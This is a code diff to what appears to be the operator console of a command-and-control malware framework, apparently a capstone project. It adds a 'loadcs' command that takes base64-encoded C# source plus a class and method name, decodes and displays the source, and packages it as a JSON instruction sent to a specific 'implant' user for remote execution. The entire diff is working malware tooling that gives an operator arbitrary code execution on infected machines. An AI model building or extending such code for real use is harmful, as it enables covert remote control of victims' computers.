@@ -165,6 +165,46 @@ namespace CapstoneInterface
 
                     sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                 }
+
+                else if (input.Contains("loadcs"))
+                {
+                    string[] result = input.Split('#');
+
+                    string instruction = result[0];
+                    string className = result[1];
+                    string methodName = result[2];
+                    string encodedSourceCode = result[3]; // The base64 encoded source code
+
+                    instruction = instruction.TrimEnd();
+                    className = className.TrimStart();
+                    className = className.TrimEnd();
+                    methodName = methodName.TrimStart();
+                    methodName = methodName.TrimEnd();
+                    encodedSourceCode = encodedSourceCode.TrimStart();
+                    encodedSourceCode = encodedSourceCode.TrimEnd();
+
+                    txtConsoleOutput.AppendText("\r\n\r\nExecuting: " + className + "." + methodName + " For:");
+                    byte[] code = Convert.FromBase64String(encodedSourceCode);
+                    string decodedSourceCode = Encoding.UTF8.GetString(code);
+                    txtConsoleOutput.AppendText("\r\n\r\n" + decodedSourceCode + "\r\n\r\n");
+
+                    String userCommand = @" (04/25)> " + operatorName + " sent " + instruction.ToString() + " to '" + userToControl + "'";
+
+                    txtConsoleOutput.AppendText("\r\n\r\n");
+                    // Append the user command to the console output
+                    txtConsoleOutput.AppendText(userCommand + "\r\n");
+
+                    commandForImplant.Input = instruction;
+                    commandForImplant.ImplantUser = userToControl;
+                    commandForImplant.Operator = operatorName;
+                    commandForImplant.timeToExec = "0";
+                    commandForImplant.delay = "0";
+                    commandForImplant.File = encodedSourceCode + " # " + className + " # " + methodName; // Combine encoded source code, class and method into one string
+                    
+                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);
+
+                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
+                }
             }
         }
 
